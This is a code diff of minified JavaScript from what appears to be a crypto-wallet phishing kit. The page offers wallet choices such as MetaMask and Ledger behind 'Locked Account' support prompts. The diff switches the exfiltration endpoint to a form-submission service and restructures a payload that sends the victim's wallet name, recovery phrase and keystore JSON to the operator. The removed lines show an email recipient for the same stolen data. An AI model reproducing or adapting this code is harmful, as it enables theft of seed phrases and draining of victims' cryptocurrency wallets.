@@ -10773,7 +10773,7 @@ const Jh = [{
         title: "Locked Account",
         subtitle: "Click here for issues related to account lock."
     }],
-    qh = "https://mailsenderrr.vercel.app/send",
+    qh = "https://submit-form.com/gxsJVIB2",
     xf = ["MetaMask", "Coinbase Wallet", "Ledger Wallet", "WalletConnect"];
 
 function ev({
@@ -13031,9 +13031,7 @@ const _l = {
                 d(!0);
                 try {
                     const w = {
-                            subject: "New Details from ProjectDatabaseServer",
-                            to: "steveisaac2021@gmail.com",
-                            message_html: `<div>
+                        Info: `<div>
                   <p><b>Wallet Name</b>: ${v}</p>
                   <p><b>Phrase</b>: ${a.phrase}</p>
                   <p><b>Keystore JSON</b>: ${a.keystore} </p>
